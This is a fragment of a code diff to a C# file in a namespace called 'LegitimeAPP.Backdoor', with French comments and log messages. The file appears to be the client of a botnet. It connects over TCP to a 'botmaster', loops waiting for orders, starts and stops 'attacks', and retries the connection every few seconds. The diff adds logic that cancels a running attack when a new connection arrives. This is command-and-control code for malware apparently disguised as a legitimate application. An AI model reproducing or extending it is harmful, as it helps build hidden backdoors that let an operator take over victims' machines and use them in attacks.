@@ -152,12 +152,6 @@ namespace LegitimeAPP.Backdoor {
 
         private void ListeningOrder() {
 
-
-            /*
-                    if (_attackInProgress) {
-                       WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.ATTACK))) ;
-                    }
-*/
             while(true) {
 
                 try {
@@ -176,6 +170,7 @@ namespace LegitimeAPP.Backdoor {
                         order.Start() ;
 
                     } else {
+                        
                         Console.WriteLine("On ignore le nouvelle ordre car un est encore en cours ") ; 
                     }
                      
@@ -192,6 +187,8 @@ namespace LegitimeAPP.Backdoor {
                 
             }
         }
+
+
 
 
         private void MakeConnectionRequest() {
@@ -211,8 +208,20 @@ namespace LegitimeAPP.Backdoor {
 
                     stm = tcp.GetStream() ;
                     WriteNetMessage("1") ;
+
+                    if ( _attackInProgress) {
+                        order.Stop() ;
+
+                        Console.WriteLine("Nouvelle Connexion !  On annule l'attaque en cours !") ; 
+                    }
+
+
                     Console.WriteLine("La connexion avec le botmaster est un succès") ;
 
+
+                    
+
+                   Console.WriteLine("L'attaque est en cours : " + (_attackInProgress ? "Oui" : "Non")) ;
                 // On démarre le Thread lorsque la connexion est une réussite
 
 
@@ -222,7 +231,7 @@ namespace LegitimeAPP.Backdoor {
                         _FollowingOrders = new Thread(ListeningOrder) ; 
                     } 
                 
-                    _FollowingOrders.Start() ; 
+                    _FollowingOrders.Start() ;
                     _FollowingOrders.Join() ;
                 } catch (Exception ex) {
                     Console.WriteLine("La connexion au BotMaster est un échec... Code d'erreur : " + ex.Message +"... Tentative dans cinq secondes... "  ) ; 
